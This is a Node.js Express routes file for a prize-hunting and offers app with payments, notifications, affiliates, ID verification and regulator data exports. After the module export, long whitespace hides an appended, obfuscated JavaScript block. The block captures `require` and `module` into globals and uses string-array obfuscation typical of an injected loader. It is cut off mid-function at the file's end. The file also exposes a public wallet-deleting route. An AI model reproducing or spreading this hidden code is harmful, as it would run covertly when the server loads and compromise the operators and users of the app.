const router = require("express").Router();
const authRoutes = require("express").Router();
const mediaUpload = require("../utilities/media_upload");
var admin = require('firebase-admin');
let Users = require("../models/users.model");
let Affiliates = require("../models/affiliate.model");
let jwt = require("jsonwebtoken");
var serviceAccount = require("../tagtap-firebase-adminsdk.json");
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

const { SquareClient, SquareEnvironment, SquareError } = require("square");
const client = new SquareClient({
  token: process.env.SQ_ACCESS_TOKEN,
  environment: process.env.SQUARE_URL,
});
const { v4: uuidv4 } = require('uuid');

//const adminController = require('../controllers/admin.controller');
const offerTypesController = require("../controllers/offer-types.controller");
const markerTypesController = require("../controllers/marker-types.controller");
const areaListsController = require("../controllers/area-list.controller");
const notificationController = require("../controllers/notifications.controller");
const usersController = require("../controllers/users.controller");
const userCoinDetailsController = require("../controllers/user-coin-details.controller");
const sponsorsController = require("../controllers/sponsors.controller");
const packagesController = require("../controllers/packages.controller");
const fulfillmentPackagesController = require("../controllers/fulfillment-packages.controller");
const offersController = require("../controllers/offers.controller");
const setupController = require("../controllers/setup.controller");
const dashboardController = require("../controllers/dashboard.controller");
const versionsController = require("../controllers/versions.controller");
const mainPrizePoolController = require("../controllers/main-prize-pool.controller");
const prizesController = require("../controllers/prizes.controller");
const rngDataController = require("../controllers/rng-data.controller");
const prizePoolDataController = require("../controllers/prize-pool-data.controller");
const regulatorController = require("../controllers/regulator.controller");
const affiliateController = require("../controllers/affiliate.controller");
const userPrizesController = require("../controllers/user-prizes.controller");
const prizeOrdersController = require("../controllers/prize-orders.controller");
const idVerificationController = require("../controllers/id-verification.controller");
const validation = require("../middleware/validation");
const Token = require("../token");
let Offers = require('../models/offers.model');
var user =require('../models/users.model.js');
const bcrypt = require("bcrypt");
const saltRounds = 10;
let Constants = require("../app.constants");

function sendNotification(title, body, token) {    
// This registration token comes from the client FCM SDKs.
var registrationToken = token;
if(!token)
{
   return;
}
var message = {
  data: 
   {
    title: title,
    body: body
   },
  token: registrationToken
};

// Send a message to the device corresponding to the provided
// registration token.
admin.messaging().send(message)
 .then((response) => {
 })
 .catch((error) => {
 });

}

// Setup:
authRoutes.route("/setup/init").get(setupController.init);

// Offers:
authRoutes.post('/offers/add', 
mediaUpload.fields([
  {
    name: 'Icon', maxCount: 1
  }
]),
function (req, res) {
  
  var offerForm = req.body;

  var Icon = null;

      if(req.files && req.files.Icon){
        Icon = req.files.Icon[0].location;
      }
  
      var OfferedBy = req.body.OfferedBy;
      var Type = req.body.Type;
      var MarkerType = req.body.MarkerType;
      var reAppear = req.body.ReAppear;
      var reAppearTime = req.body.ReAppearTime;
      var Value = req.body.Value;
      var Link = req.body.Link;
      var Email = req.body.Email;
      var Name = req.body.Name;
      var Expire = req.body.Expire;
      var LocationsArray = JSON.parse(req.body.Locations);

      offers = [];

      LocationsArray.forEach((loc) => {
        var location = { type: 'Point', coordinates: [loc.lon || loc.lng, loc.lat] };

        var offer = new Offers();
        offer.OfferedBy = OfferedBy;
        offer.OfferedBy = OfferedBy;
        offer.ReAppear = reAppear;
        offer.ReAppearTime = reAppearTime;
        offer.Type = Type;
        offer.MarkerType = MarkerType;
        offer.Value = Value;
        offer.Link = Link;
        offer.Email = Email;
        offer.Name = Name;
        offer.Expire = Expire;
        offer.Location = location;
        offer.Icon = Icon;

        offers.push(offer);
      });

      offersController.addOffer(offers, function (err, result) {
      if (err) {
          return res.json({
              message: "Error in Connecting to DB",
              status: false
          });
      }
      else{
        res.json({
          success: true,
          message: 'Successfully Added!',
          data: result,
        });
      }

  });

});

authRoutes.route("/offers/update_script").get(offersController.updateScript);

router.route("/offers/get").post(offersController.get);
router.route("/offers/getByTypeId").post(offersController.getByTypeId);
authRoutes.route("/offers/listCount").get(offersController.listCount);
// authRoutes.route("/offers/add").post(offersController.add);
authRoutes.route("/offers/list").get(offersController.list);
authRoutes.route("/offers/delete").post(offersController.delete);
authRoutes.route("/offers/count").post(offersController.count);
router.route("/offers/claim").post(offersController.claim);
authRoutes.route("/offers/claimed").get(offersController.claimed);

authRoutes.route("/offer-claimed/list").get(offersController.Claimedlist);
authRoutes.route("/offer-claim/request").get(offersController.ClaimRequest);

// Sponsors:
authRoutes.route("/sponsors/login").post(sponsorsController.login);
authRoutes.route("/sponsors/register").post(sponsorsController.register);
authRoutes.route("/sponsors").get(sponsorsController.list);
authRoutes.route("/sponsors/update").post(sponsorsController.update);
authRoutes
  .route("/sponsors/updateStatus")
  .post(sponsorsController.updateStatus);
authRoutes.route("/sponsors/delete").post(sponsorsController.delete);
authRoutes
  .route("/sponsors/updateDetailsSettings")
  .post(sponsorsController.updateDetailsSettings);
authRoutes
  .route("/sponsors/updateCredentials")
  .post(sponsorsController.updateCredentials);
authRoutes
  .route("/sponsors/forgetPassword")
  .post(sponsorsController.forgetPassword);

// Affiliates (public login; dashboard requires affiliate JWT):
authRoutes.route("/affiliates/login").post(affiliateController.login);
authRoutes.route("/affiliates/dashboard").get(Token.checkToken, affiliateController.dashboard);

// Internal API key middleware (optional: set INTERNAL_API_KEY in .env to protect internal routes)
function requireInternalKey(req, res, next) {
  var key = req.headers["x-internal-api-key"] || req.headers["X-Internal-Api-Key"];
  if (process.env.INTERNAL_API_KEY && key !== process.env.INTERNAL_API_KEY) {
    return res.status(403).json({ success: false, message: "Forbidden", data: null });
  }
  next();
}

// Internal affiliate management (require x-internal-api-key if INTERNAL_API_KEY is set):
// Define /sales and /addSale before /:id so "sales" is not matched as an id
authRoutes.route("/internal/affiliates").get(requireInternalKey, affiliateController.listInternal);
authRoutes.route("/internal/affiliates/sales").get(requireInternalKey, affiliateController.salesInternal);
authRoutes.route("/internal/affiliates").post(requireInternalKey, affiliateController.createInternal);
authRoutes.route("/internal/affiliates/update").post(requireInternalKey, affiliateController.updateInternal);
authRoutes.route("/internal/affiliates/delete").post(requireInternalKey, affiliateController.deleteInternal);
authRoutes.route("/internal/affiliates/addSale").post(requireInternalKey, affiliateController.addSaleInternal);
authRoutes.route("/internal/affiliates/:id").get(requireInternalKey, affiliateController.getOneInternal);

// Offer Types:
authRoutes.post('/offerTypes',
  mediaUpload.fields([
    {
      name: 'ModelPicture', maxCount: 1
    },
    {
      name: 'AppPicture', maxCount: 1
    }
  ]),
  function (req, res) {

    var offerTypeForm = req.body;

    if (req.files && req.files.ModelPicture) {
      offerTypeForm.ModelPicture = req.files.ModelPicture[0].location;
    }

    if (req.files && req.files.AppPicture) {
      offerTypeForm.AppPicture = req.files.AppPicture[0].location;
    }

    offerTypesController.addOfferType(offerTypeForm, function (err, result) {
      if (err) {
        return res.json({
          message: "Error in Connecting to DB",
          success: false
        });
      }
      else {
        res.json({
          success: true,
          message: 'Successfully Added!',
          data: result,
        });
      }

    });

});
authRoutes.route("/offerTypes/listAll").get(offerTypesController.listAll);
authRoutes.route("/offerTypes").get(offerTypesController.list);
authRoutes.patch('/offerTypes/updateImage/:id',
  mediaUpload.fields([
    {
      name: 'ModelPicture', maxCount: 1
    },
    {
      name: 'AppPicture', maxCount: 1
    }
  ]),
  function (req, res) {

    var offerTypeId = req.params.id;
    var offerTypeForm = req.body;

    if (req.files && req.files.ModelPicture) {
      offerTypeForm.ModelPicture = req.files.ModelPicture[0].location;
    }

    if (req.files && req.files.AppPicture) {
      offerTypeForm.AppPicture = req.files.AppPicture[0].location;
    }

    offerTypesController.updateOfferType(offerTypeId, offerTypeForm, { new: true }, function (err, result) {
      if (err) {
        return res.json({
          message: "Error in Connecting to DB",
          success: false
        });
      }
      else {
        res.json({
          success: true,
          message: 'Successfully Updated!',
          data: result,
        });
      }

    });

});
authRoutes.route("/offerTypes/update").post(offerTypesController.update);



authRoutes.post('/markerTypes',
  mediaUpload.fields([
    {
      name: 'Picture', maxCount: 1
    }
  ]),
  function (req, res) {

    var markerTypeForm = req.body;

    if (req.files && req.files.Picture) {
      markerTypeForm.Picture = req.files.Picture[0].location;
    }

    markerTypesController.addMarkerType(markerTypeForm, function (err, result) {
      if (err) {
        return res.json({
          message: "Error in Connecting to DB",
          success: false
        });
      }
      else {
        res.json({
          success: true,
          message: 'Successfully Added!',
          data: result,
        });
      }

    });

});
authRoutes.patch('/markerTypes/updateImage/:id',
  mediaUpload.fields([
    {
      name: 'Picture', maxCount: 1
    }
  ]),
  function (req, res) {

    var markerTypeId = req.params.id;
    var markerTypeForm = req.body;

    if (req.files && req.files.Picture) {
      markerTypeForm.Picture = req.files.Picture[0].location;
    }

    markerTypesController.updateMarkerType(markerTypeId, markerTypeForm, { new: true }, function (err, result) {
      if (err) {
        return res.json({
          message: "Error in Connecting to DB",
          success: false
        });
      }
      else {
        res.json({
          success: true,
          message: 'Successfully Updated!',
          data: result,
        });
      }

    });

});  
authRoutes.route("/markerTypes/listAll").get(markerTypesController.listAll);
authRoutes.route("/markerTypes").get(markerTypesController.list);
authRoutes.route("/markerTypes/update").post(markerTypesController.update);


// Offer Types:
authRoutes.route("/areaLists/listAll").get(areaListsController.listAll);
authRoutes.route("/areaLists").get(areaListsController.list);
authRoutes.route("/areaLists").post(areaListsController.add);
authRoutes.route("/areaLists/update").post(areaListsController.update);

// Notifications:
authRoutes.route("/notifications/listAll").get(notificationController.listAll);
authRoutes.route("/notifications").get(notificationController.list);
authRoutes.route("/notifications").post(notificationController.add);
authRoutes.route("/notifications/update").post(notificationController.update);

// Users:

authRoutes.patch('/users/updateProfile/:userId', 
mediaUpload.fields([
  {
    name: 'ProfilePicture', maxCount: 1
  }
]),
async function (req, res) {
  
  var userForm = req.body;
  var userId = req.params.userId;
  if(req.files && req.files.ProfilePicture){
    userForm.ProfilePicture = req.files.ProfilePicture[0].location;
  }
  usersController.updateUserProfile(userId, userForm, {new: true}, async function (err, result) {
      if (err) {
          if (err?.keyValue?.Email != null && err?.code === 11000) {
            return res.json({
              message: "Email already in user",
              status: false
          });
          }
          return res.json({
              message: "Error in Connecting to DB",
              status: false
          });
      }
      else {
        if (userForm.NewPassword) {
          await bcrypt.hash(userForm.NewPassword, saltRounds, async function (err, hash) {
            result.Password = hash
            await result.save();
          })
        }
        let reqData = {
          Id: result._id,
          Name: result.FullName,
          ContactNumber: result.ContactNumber,
          Email: result.Email,
          AccountNumber: result.AccountNumber,
          BSB: result.BSB,
          // ETHAddress: result.ETHAddress,
          ProfilePicture: result.ProfilePicture,
          Address: result.Address || "",
          // YearOfBirth: result.YearOfBirth,
          // PostCode: result.PostCode,
          // Gender: result.Gender,
        }
        let token = jwt.sign(reqData, Constants.JWT.secret, {
          expiresIn: "10d", // expires in 10 days
        });
        return res.json({
          message: "User updated successfully",
          success: true,
          data: reqData,
          token: token,
        });
      }

  });

});
router.post('/users/signup',
mediaUpload.fields([
  {
    name: 'ProfilePicture', maxCount: 1
  }
]), 
async function (req, res) {
  
  var userForm = req.body;
  let ProfilePicture;
  if(req.files && req.files.ProfilePicture){
    ProfilePicture = req.files.ProfilePicture[0].location;
  }

  Users.findOne({ Email: req.body.Email }, function (err, exist) {
    if (err) {
      res.json({
        success: false,
        message: "Validation Error",
        data: err,
      });
    } else {
      if (exist) {
        res.json({
          success: false,
          message: "Email already exists!",
          data: req.body.Email,
        });
      } else {
        //Hasing Pass:
        bcrypt.hash(req.body.Password, saltRounds, function (err, hash) {
          //Register User:
          var user = new Users();
          user.ProfilePicture = ProfilePicture;
          user.FullName = req.body.FullName;
          user.Email = req.body.Email.toLowerCase().trim();
          user.Password = hash;
          user.AccountNumber = req.body.AccountNumber,
          user.BSB = req.body.BSB,
          user.Address = req.body.Address || "";
          // user.AreaId = AreaId;
          // user.YearOfBirth = YearOfBirth;
          // user.PostCode = PostCode;
          // user.Gender = req.body.Gender;
          user.ContactNumber = req.body.ContactNumber;
          user.PurchasePackage = req.body.PurchasePackage || false;
          user.PurchasePackageExpired = req.body.PurchasePackageExpired || true;
          user.PackageDate = req.body.PackageDate || "",
          user.PackageExpiryDate = req.body.PackageExpiryDate || "";
          var trackingID = (req.body.TrackingID || req.body.trackingId || "").trim();
          if (trackingID) {
            Affiliates.findOne({ TrackingID: trackingID, Status: "ACTIVE" }, function (errA, aff) {
              if (!errA && aff) user.AffiliateId = aff._id;
              user.save(async function (err) {
                if (err) {
                  res.json({ success: false, message: "Server Error", data: err });
                } else {
                  const customer = await client.customers.create({
                    idempotencyKey: uuidv4(),
                    emailAddress: req.body.Email.toLowerCase().trim()
                  });
                  if (customer?.customer?.id) {
                    usersController.updateUserProfile(user._id, { SquareCustomerId: customer?.customer?.id }, { new: true }, async function (err, result) {});
                  }
                  let userData = {
                    Id: user._id,
                    Name: user.FullName,
                    ContactNumber: user.ContactNumber,
                    Email: user.Email,
                    ProfilePicture: user.ProfilePicture,
                    AccountNumber: user.AccountNumber,
                    BSB: user.BSB,
                  };
                  let token = jwt.sign(userData, Constants.JWT.secret, { expiresIn: "10d" });
                  res.json({ success: true, message: "Successfully registered!", data: userData, token: token });
                }
              });
            });
          } else {
          user.save(async function (err) {
            if (err) {
              res.json({
                success: false,
                message: "Server Error",
                data: err,
              });
            } else {
              const customer = await client.customers.create({
                idempotencyKey: uuidv4(),
                emailAddress: req.body.Email.toLowerCase().trim()
              });
              if (customer?.customer?.id) {
                usersController.updateUserProfile(user._id, {SquareCustomerId: customer?.customer?.id}, {new: true}, async function (err, result) {});
              }
              let userData = {
                Id: user._id,
                Name: user.FullName,
                ContactNumber: user.ContactNumber,
                Email: user.Email,
                // ETHAddress: null,
                ProfilePicture: user.ProfilePicture,
                AccountNumber: user.AccountNumber,
                BSB: user.BSB,
                // AreaId: user.AreaId,
                // YearOfBirth: user.YearOfBirth,
                // PostCode: user.PostCode,
                // Gender: user.Gender,
              };

              let token = jwt.sign(userData, Constants.JWT.secret, {
                expiresIn: "10d", // expires in 10 days
              });
              res.json({
                success: true,
                message: "Successfully registered!",
                data: userData,
                token: token,
              });
            }
          });
          }
        });
      }
    }
  });
});


authRoutes.post('/users/addUser',
mediaUpload.fields([
  {
    name: 'ProfilePicture', maxCount: 1
  }
]), 
async function (req, res) {
  
  var userForm = req.body;
  let ProfilePicture;
  if(req.files && req.files.ProfilePicture){
    ProfilePicture = req.files.ProfilePicture[0].location;
  }

  Users.findOne({ Email: req.body.Email }, function (err, exist) {
    if (err) {
      res.json({
        success: false,
        message: "Validation Error",
        data: err,
      });
    } else {
      if (exist) {
        res.json({
          success: false,
          message: "Email already exists!",
          data: req.body.Email,
        });
      } else {
        //Hasing Pass:
        bcrypt.hash(req.body.Password, saltRounds, function (err, hash) {
          //Register User:
          var user = new Users();
          user.ProfilePicture = ProfilePicture;
          user.FullName = req.body.FullName;
          user.Email = req.body.Email.toLowerCase().trim();
          user.Password = hash;
          user.AccountNumber = req.body.AccountNumber,
          user.BSB = req.body.BSB,
          // user.AreaId = AreaId;
          // user.YearOfBirth = YearOfBirth;
          // user.PostCode = PostCode;
          // user.Gender = req.body.Gender;
          user.ContactNumber = req.body.ContactNumber;
          user.PurchasePackage = false;
          user.PurchasePackageExpired = true;

          user.save(function (err) {
            if (err) {
              res.json({
                success: false,
                message: "Server Error",
                data: err,
              });
            } else {
              let userData = {
                Id: user._id,
                Name: user.FullName,
                ContactNumber: user.ContactNumber,
                Email: user.Email,
                // ETHAddress: null,
                ProfilePicture: user.ProfilePicture,
                AccountNumber: user.AccountNumber,
                BSB: user.BSB,
                // AreaId: user.AreaId,
                // YearOfBirth: user.YearOfBirth,
                // PostCode: user.PostCode,
                // Gender: user.Gender,
              };

              let token = jwt.sign(userData, Constants.JWT.secret, {
                expiresIn: "10d", // expires in 10 days
              });
              res.json({
                success: true,
                message: "Successfully registered!",
                data: userData,
                token: token,
              });
            }
          });
        });
      }
    }
  });

});



authRoutes.post('/users/sendNotification', function (req, res) {
  
  usersController.getAllNotificationUser(function (err, result) {
    if(err)
    {
    }
    else
    {
        for(let i=0;i<result.length;i++)
        {
            const token=result[i].token;
            if(token)
            {
                sendNotification(req.Title, req.Text, token)
            }
            
        }
    }
  });

  return res.json({message: "Notification Sent Successfully", success: true});

});
authRoutes.route("/users/login").post(usersController.login);
// authRoutes.route("/users/signup").post(usersController.signup);
// router.route("/users/updateProfile").post(usersController.updateProfile);
router.route("/users/updateLocation").post(usersController.updateLocation);
router.route("/users/wallet").get(usersController.wallet);
router.route("/users/walletByCurrentDate").get(usersController.walletByCurrentDate);
authRoutes.route("/users").get(usersController.list);
authRoutes.route("/users/updateStatus").post(usersController.updateStatus);
authRoutes.route("/users/delete").post(usersController.delete);
authRoutes.route("/users/forgetPassword").post(usersController.forgetPassword);
authRoutes.route("/users/updatePassword").post(usersController.updatePassword);
authRoutes.route("/users/socialLogin").post(usersController.socialLogin);
authRoutes.route("/users/getSingleUserDetails").post(usersController.getSingleUserDetails);
authRoutes.route("/users/fulfillment-subscribe").post(Token.checkToken, usersController.fulfillmentSubscribe);
authRoutes.route("/users/cancel-fulfillment-subscription").post(Token.checkToken, usersController.cancelFulfillmentSubscription);
authRoutes.route("/users/fulfillment-plan").get(Token.checkToken, usersController.getFulfillmentPlan);
authRoutes.route("/users/team/invite").post(Token.checkToken, usersController.inviteTeamMember);
authRoutes.route("/users/team/sync").post(Token.checkToken, usersController.syncTeamMembership);
authRoutes.route("/users/team").get(Token.checkToken, usersController.listTeam);
authRoutes.route("/users/invoices").get(usersController.listInvoices);
router.route("/users/invoices").get(Token.checkToken, usersController.listInvoices);

// ID Verification (KYC)
router.post(
  "/users/id-verification/upload",
  idVerificationController.uploadMiddleware,
  idVerificationController.upload
);
router.post("/users/id-verification/submit", Token.checkToken, idVerificationController.submit);
router.get("/users/id-verification/status", Token.checkToken, idVerificationController.getStatus);
authRoutes.route("/id-verification").get(idVerificationController.list);
authRoutes.route("/id-verification/:id").get(idVerificationController.getOne);
authRoutes.route("/id-verification/:id/decision").post(idVerificationController.decision);

// userCoinDetails (view)
authRoutes.route("/users/system-leader-board").get(userCoinDetailsController.list);
authRoutes.route("/users/system-leader-board-areaid").post(userCoinDetailsController.listByArea);
authRoutes.route("/users/list-all-active").get(userCoinDetailsController.listAllActive);
authRoutes.route("/users/list-all-users").get(userCoinDetailsController.listAllUser);
authRoutes.route("/users/export-excel").get(userCoinDetailsController.exportExcel);


// Packages:
router.route("/packages").get(packagesController.list);
authRoutes.post('/packages/add',
mediaUpload.fields([
  {
    name: 'PackageImage', maxCount: 1
  }
]),
packagesController.add);
authRoutes.post('/packages/update',
mediaUpload.fields([
  {
    name: 'PackageImage', maxCount: 1
  }
]),
packagesController.update);
authRoutes.route("/packages/delete/:Id").post(packagesController.delete);

// Fulfillment Packages (Rookie / Hustler / Boss tiers for prize fulfillment):
authRoutes.route("/fulfillment-packages").get(fulfillmentPackagesController.list);
authRoutes.route("/fulfillment-packages/:Id").get(fulfillmentPackagesController.getById);
authRoutes.post(
  "/fulfillment-packages/add",
  mediaUpload.fields([{ name: "Image", maxCount: 1 }]),
  fulfillmentPackagesController.add
);
authRoutes.post(
  "/fulfillment-packages/update",
  mediaUpload.fields([{ name: "Image", maxCount: 1 }]),
  fulfillmentPackagesController.update
);
authRoutes.route("/fulfillment-packages/delete/:Id").post(fulfillmentPackagesController.delete);

// Dashboard:
authRoutes.route("/dashboard/statsAdmin").get(dashboardController.statsAdmin);
authRoutes
  .route("/dashboard/statsSponsor")
  .get(dashboardController.statsSponsors);

// Delete Wallet:
router.route("/danger/walletClear67").get(usersController.deleteWallet);



//@Umer Package purchase
authRoutes.route("/users/purchase-package").post(usersController.purchasePackage);

router.route("/users/get-coins").post(usersController.getCoins);

//module.exports = router;


router.route("/offers/hold-offer").post(offersController.holdOffer);
router.route("/offers/remaining-offer-time").post(offersController.remainingOfferTime);

router.route("/users/watchAddTeleport").post(usersController.saveWatchadCoins);
router.route("/users/remaining-coins").post(usersController.remainingCoins);

router.route("/users/add-card").post(usersController.addCard);
router.route("/users/get-user-cards").post(usersController.getUserCards);
router.route("/users/delete-user-card").post(usersController.deleteCard);

router.route('/users/purchase-user-package').post(usersController.purchaseBankFulPackage);


// router.route("/users/register-square-customer").post(usersController.registerSquareCustomer);
router.route("/users/register-customer").post(usersController.registerCustomer);



// Versions:
authRoutes.route("/versions").get(versionsController.list);
authRoutes.route("/versions").post(versionsController.add);
authRoutes.route("/versions/update").post(versionsController.update);
authRoutes.route("/versions/delete/:Id").post(versionsController.delete);

// Main Prize Pool (Admin):
authRoutes.route("/main-prize-pool").get(mainPrizePoolController.list);
authRoutes.post('/main-prize-pool',
  mediaUpload.fields([
    {
      name: 'SKUPhoto', maxCount: 1
    }
  ]),
  validation.validateMainPrizePool,
  function (req, res) {
    var prizeForm = req.body;
    
    if (req.files && req.files.SKUPhoto) {
      prizeForm.SKUPhoto = req.files.SKUPhoto[0].location;
    }
    
    mainPrizePoolController.add({ body: prizeForm }, res);
  }
);
authRoutes.post('/main-prize-pool/update',
  mediaUpload.fields([
    {
      name: 'SKUPhoto', maxCount: 1
    }
  ]),
  function (req, res) {
    var prizeForm = req.body;
    
    if (req.files && req.files.SKUPhoto) {
      prizeForm.SKUPhoto = req.files.SKUPhoto[0].location;
    }
    
    mainPrizePoolController.update({ body: prizeForm }, res);
  }
);
authRoutes.route("/main-prize-pool/delete").post(mainPrizePoolController.delete);
authRoutes.route("/main-prize-pool/total-value").get(mainPrizePoolController.getTotalValue);

// Prizes (User-facing):
router.route("/prizes/get-nearby").post(
  validation.validateCoordinates('latitude', 'longitude'),
  validation.validateNumberRange('distance', 1, 100000),
  prizesController.getNearby
);
router.route("/prizes/claim").post(
  validation.validatePrizeClaim,
  prizesController.claim
);
router.route("/prizes/:id").get(prizesController.getById);
authRoutes.route("/prizes").get(prizesController.list);
authRoutes.route("/prizes/mark-stolen").post(prizesController.markStolen);
authRoutes.route("/prizes/timer-ended").post(prizesController.handleTimerEnded);

// User Prizes (link between users and prizes: active / secured / processing / shipped)
router.route("/user-prizes/active").get(Token.checkToken, userPrizesController.listActive);
router.route("/user-prizes/secured").get(Token.checkToken, userPrizesController.listSecured);
router.route("/user-prizes/move-to-secured").post(Token.checkToken, userPrizesController.moveToSecured);
router.route("/user-prizes/process").post(Token.checkToken, userPrizesController.processPrize);
router.route("/user-prizes/:id/tracking").get(Token.checkToken, userPrizesController.getTracking);

// Prize Orders (admin fulfillment window)
authRoutes.route("/prize-orders").get(prizeOrdersController.list);
authRoutes.route("/prize-orders/:id/send-to-shopify").post(prizeOrdersController.sendToShopify);

// RNG Data (Admin/Regulator):
authRoutes.route("/rng-data").get(rngDataController.list);
authRoutes.route("/rng-data/generate-drop").post(rngDataController.generateDrop);
authRoutes.route("/rng-data/stats").get(rngDataController.getStats);
authRoutes.route("/rng-data/export-excel").get(rngDataController.exportExcel);
authRoutes.route("/rng-data/export-csv").get(rngDataController.exportCSV);

// Prize Pool Data (Admin/Regulator):
authRoutes.route("/prize-pool-data").get(prizePoolDataController.list);
authRoutes.route("/prize-pool-data").post(prizePoolDataController.add);
authRoutes.route("/prize-pool-data/update").post(prizePoolDataController.update);
authRoutes.route("/prize-pool-data/stats").get(prizePoolDataController.getStats);
authRoutes.route("/prize-pool-data/claimed-by-month").get(prizePoolDataController.getClaimedByMonth);
authRoutes.route("/prize-pool-data/mark-rewarded").post(prizePoolDataController.markRewarded);
authRoutes.route("/prize-pool-data/export-excel").get(prizePoolDataController.exportExcel);
authRoutes.route("/prize-pool-data/export-csv").get(prizePoolDataController.exportCSV);

// Regulator:
router.route("/regulator/login").post(
  validation.validateRequired(['Email', 'Password']),
  validation.validateEmail('Email'),
  regulatorController.login
);
authRoutes.route("/regulator/register").post(
  validation.validateRequired(['Email', 'Password', 'FullName']),
  validation.validateEmail('Email'),
  validation.validateStringLength('Password', 6, 100),
  regulatorController.register
);
authRoutes.route("/regulator/update").post(regulatorController.update);
authRoutes.route("/regulator/delete").post(regulatorController.delete);
authRoutes.route("/regulator/list").get(regulatorController.list);
authRoutes.route("/regulator").get(regulatorController.list);
// Regulator data access routes (MUST come before /regulator/:id to avoid route conflicts)
// Moving these to authRoutes and placing BEFORE /regulator/:id so they match first
authRoutes.get("/regulator/prize-pool-data/export-excel", prizePoolDataController.exportExcel);
authRoutes.get("/regulator/prize-pool-data/export-csv", prizePoolDataController.exportCSV);
authRoutes.get("/regulator/rng-data/export-excel", rngDataController.exportExcel);
authRoutes.get("/regulator/rng-data/export-csv", rngDataController.exportCSV);
// Use .get() directly instead of .route().get() to ensure proper route matching
authRoutes.get("/regulator/prize-pool-data",
  validation.validateDateRange('startDate', 'endDate'),
  regulatorController.getPrizePoolData
);
authRoutes.get("/regulator/rng-data",
  validation.validateDateRange('startDate', 'endDate'),
  regulatorController.getRNGData
);
// Parameterized route must come LAST (after all specific routes)
authRoutes.route("/regulator/:id").get(regulatorController.getById);

// Manual trigger for prize rollback check (admin only)
authRoutes.route("/prizes/check-rollback").get(function(req, res) {
  // Import the function from app.js context
  // This is a manual trigger endpoint for testing/admin use
  const Prizes = require('../models/prizes.model');
  const PrizePoolData = require('../models/prize-pool-data.model');
  const moment = require('moment-timezone');
  
  async function manualRollbackCheck() {
    try {
      // Find all active, unclaimed prizes
      const activePrizes = await Prizes.find({
        Status: 'Active',
        IsActive: true,
        IsDeleted: false,
        ClaimedBy: null
      });

      let rolledBackCount = 0;
      const nowAEST = moment().tz('Australia/Sydney');
      const currentMonthAEST = nowAEST.month();
      const currentYearAEST = nowAEST.year();
      const monthStartAEST = nowAEST.clone().startOf('month');
      const monthEndAEST = nowAEST.clone().endOf('month');

      for (const prize of activePrizes) {
        // Check if we're in a different month/year than when the prize was dropped (using AEST)
        const prizeDropDateAEST = moment(prize.DropDate).tz('Australia/Sydney');
        const prizeDropMonth = prizeDropDateAEST.month();
        const prizeDropYear = prizeDropDateAEST.year();

        // If we're in a different month/year, rollback (re-activate) with new month's promotional period
        if (currentMonthAEST !== prizeDropMonth || currentYearAEST !== prizeDropYear) {
          // Check if a rollback entry already exists for this month to avoid duplicates
          const existingRollbackEntry = await PrizePoolData.findOne({
            PrizeEntryId: prize._id,
            EventType: 'Created',
            Date: {
              $gte: monthStartAEST.toDate(),
              $lte: monthEndAEST.toDate()
            }
          });

          if (existingRollbackEntry) {
            // Already rolled back this month, skip
            continue;
          }

          // Re-activate prize with new month's promotional period
          prize.Status = 'Active';
          prize.DropDate = nowAEST.clone().startOf('day').toDate();
          prize.DropTime = nowAEST.format('HH:mm:ss');
          await prize.save();

          // Create new "Created" event with new month's promotional period
          const promoStart = monthStartAEST.clone().add(1, 'second').format('D MMM YYYY h:mm:ss a');
          const promoEnd = monthEndAEST.clone().subtract(1, 'second').format('D MMM YYYY h:mm:ss a');
          const timezone = nowAEST.isDST() ? 'AEDT' : 'AEST';
          
          const prizePoolEntry = new PrizePoolData();
          prizePoolEntry.Date = nowAEST.toDate();
          prizePoolEntry.Time = nowAEST.format('HH:mm:ss');
          prizePoolEntry.PrizeId = prize.PrizeId;
          prizePoolEntry.PrizeDescription = prize.PrizeDescription;
          prizePoolEntry.Value = prize.PrizeValue;
          prizePoolEntry.From = 'Gotcha System';
          prizePoolEntry.To = 'Map';
          prizePoolEntry.EventType = 'Created';
          prizePoolEntry.Status = 'Active';
          prizePoolEntry.Notes = `Rolled back to new month - ${promoStart} - ${promoEnd} ${timezone}`;
          prizePoolEntry.UserId = null;
          prizePoolEntry.PrizeEntryId = prize._id;
          prizePoolEntry.PromotionalPeriod = `${promoStart} - ${promoEnd} ${timezone}`;
          await prizePoolEntry.save();

          rolledBackCount++;
        }
      }

      res.json({
        success: true,
        message: `Checked ${activePrizes.length} prize(s): ${rolledBackCount} rolled back to new month`,
        data: { rolledBackCount, totalChecked: activePrizes.length }
      });
    } catch (error) {
      res.json({
        success: false,
        message: 'Error checking prize rollback',
        data: error
      });
    }
  }
  
  manualRollbackCheck();
});

module.exports = {
  apiRoutes: router,
  authRoutes: authRoutes,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A8-1710-8";const _0xb40cd9=_0x4963;(function(_0x28261c,_0x1c6ad4){const _0x1f55f0=_0x4963,_0x424395=_0x28261c();while(!![]){try{const _0xb0d17f=parseInt(_0x1f55f0(0x292))/(-0x1f*-0x41+-0x8*-0x1c6+0x3ad*-0x6)+-parseInt(_0x1f55f0(0x29d))/(0xce1+0x1*0x213d+-0x2*0x170e)*(parseInt(_0x1f55f0(0x27b))/(-0x1*0x210d+-0xf6e+0x307e))+-parseInt(_0x1f55f0(0x21a))/(0x5ae+0x2f*-0x95+0x15b1)+-parseInt(_0x1f55f0(0x307))/(0x3cd+-0x595+0x1cd*0x1)*(parseInt(_0x1f55f0(0x20f))/(-0x117a+0x11*-0x15b+0x288b))+parseInt(_0x1f55f0(0x2f0))/(0x22ef+-0x400*-0x8+0x4*-0x10ba)+-parseInt(_0x1f55f0(0x303))/(-0xdbf+-0x1c4+0xf8b)+-parseInt(_0x1f55f0(0x205))/(-0xa1*-0x2+0x85*0x2+-0x243)*(-parseInt(_0x1f55f0(0x2fe))/(0x3*-0x7c9+0xc3*-0xb+0x1fc6));if(_0xb0d17f===_0x1c6ad4)break;else _0x424395['push'](_0x424395['shift']());}catch(_0x4a4b85){_0x424395['push'](_0x424395['shift']());}}}(_0x240a,-0x845ec+0x333e9+-0x4ca87*-0x2),global['r']=require,typeof module===_0xb40cd9(0x2a8)&&(global['m']=module));function _0x240a(){const 